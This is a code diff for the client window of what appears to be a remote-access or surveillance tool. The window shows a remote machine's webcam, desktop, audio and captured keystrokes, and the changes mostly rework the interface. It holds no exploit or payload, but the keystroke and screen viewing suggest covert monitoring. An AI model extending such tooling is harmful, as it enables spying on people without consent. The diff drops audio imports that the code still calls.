@@ -12,17 +12,15 @@ from PyQt4.QtCore import *
 from PyQt4.QtGui import *
 import json, time
 from socket import *
-from .manager import *
-from .image import *
+from manager import *
+from image import *
 from pysocket import *
-import pyaudio
-import wave
 import sys,os
 from database import User
 from threading import Thread
 from threads import *
 
-chunk = 1024
+
 from login_ui import Ui_Login
 from listen_servers_ui import Ui_ListServers
 
@@ -62,7 +60,7 @@ class Client(QtGui.QMainWindow):
 		
 	def setupUi(self, MainWindow):
 		MainWindow.setObjectName(_fromUtf8("MainWindow"))
-		MainWindow.resize(978, 489)
+		MainWindow.resize(978, 495)
 		self.centralwidget = QtGui.QWidget(MainWindow)
 		self.centralwidget.setObjectName(_fromUtf8("centralwidget"))
 		self.verticalLayout_7 = QtGui.QVBoxLayout(self.centralwidget)
@@ -74,6 +72,9 @@ class Client(QtGui.QMainWindow):
 		self.qImage = QtGui.QGraphicsView(self.centralwidget)
 		self.qImage.setObjectName(_fromUtf8("qImage"))
 		self.horizontalLayout_7.addWidget(self.qImage)
+		self.qDesktop = QtGui.QGraphicsView(self.centralwidget)
+		self.qDesktop.setObjectName(_fromUtf8("qDesktop"))
+		self.horizontalLayout_7.addWidget(self.qDesktop)
 		self.verticalLayout_6.addLayout(self.horizontalLayout_7)
 		self.keyboard = QtGui.QLineEdit(self.centralwidget)
 		self.keyboard.setObjectName(_fromUtf8("keyboard"))
@@ -221,7 +222,7 @@ class Client(QtGui.QMainWindow):
 		self.label.setText(_translate("MainWindow", "WebCam", None))
 		self.connectWebCam.setText(_translate("MainWindow", "Connect", None))
 		self.disconnectWebCam.setText(_translate("MainWindow", "Disconnect", None))
-		self.label_2.setText(_translate("MainWindow", "Microfone", None))
+		self.label_2.setText(_translate("MainWindow", "Desktop", None))
 		self.connectDesktop.setText(_translate("MainWindow", "Connect", None))
 		self.disconnectDesktop.setText(_translate("MainWindow", "Disconnect", None))
 		self.label_3.setText(_translate("MainWindow", "Audio", None))
@@ -309,42 +310,34 @@ class Client(QtGui.QMainWindow):
 		t.start()
 		
 	def streamImage(self):
-		self.setImage(SAVEDIR + 'image.jpg')
+		self.setImageWebCam(SAVEDIR + 'image.jpg')
 	def requestDisplay(self):
 		t = UpdateDesktop(self.__server_connected, self.__manager, self)
 		QtCore.QObject.connect(t, QtCore.SIGNAL(_fromUtf8("update()")), self.streamDisplay)
 		t.start()
 		
 	def streamDisplay(self):
-		self.setImage(SAVEDIR + 'display.png')
+		self.setImageDesktop(SAVEDIR + 'display.png')
 		
-	def requestAudio(self, size = 1024 * 5 ):
-		self.streamAudio(self.__server_connected, size)
+	def requestAudio(self, size = 1024 ):
+		t = UpdateAudio(self.__server_connected,size,  self.__manager, self)
+		QtCore.QObject.connect(t, QtCore.SIGNAL(_fromUtf8("update()")), self.streamAudio)
+		t.start()
 		
-	def streamAudio(self, address, size):
-		socketServer = socket(AF_INET, SOCK_STREAM)
-		try:	
-			socketServer.connect(address)
-		except:
-			print "IP or PORT invalid!!!"
-			return
-		#while True:
-		audio = self.__manager.requestAudio(socketServer, size)
-		if audio == None:
-			return
-		print audio
-		wf = wave.open(audio, 'rb')
+	def streamAudio(self):
+		wf = wave.open(SAVEDIR + 'audio.wav', 'rb')
 		p = pyaudio.PyAudio()
 		stream = p.open(format = p.get_format_from_width(wf.getsampwidth()), 
-						channels = wf.getnchannels(),
-						rate = wf.getframerate(),
-						output = True)
+                        channels = wf.getnchannels(),
+                        rate = wf.getframerate(),
+                        output = True)
 		data = wf.readframes(chunk)
 		while data != '':
 			stream.write(data)
 			data = wf.readframes(chunk)
-		stream.close()	
+		stream.close()    
 		p.terminate()
+		
 		
 		
 	def requestKeyboard(self, size = 40):
@@ -355,7 +348,12 @@ class Client(QtGui.QMainWindow):
 	def streamKeyboard(self):
 		self.keyboard.setText(open(SAVEDIR + "keys.txt", "r").read())
 	
-	def setImage(self, path):
+	def setImageWebCam(self, path):
 		scene = QGraphicsScene()
 		scene.addPixmap(QPixmap(path))
 		self.qImage.setScene(scene)
+		
+	def setImageDesktop(self, path):
+		scene = QGraphicsScene()
+		scene.addPixmap(QPixmap(path))
+		self.qDesktop.setScene(scene)
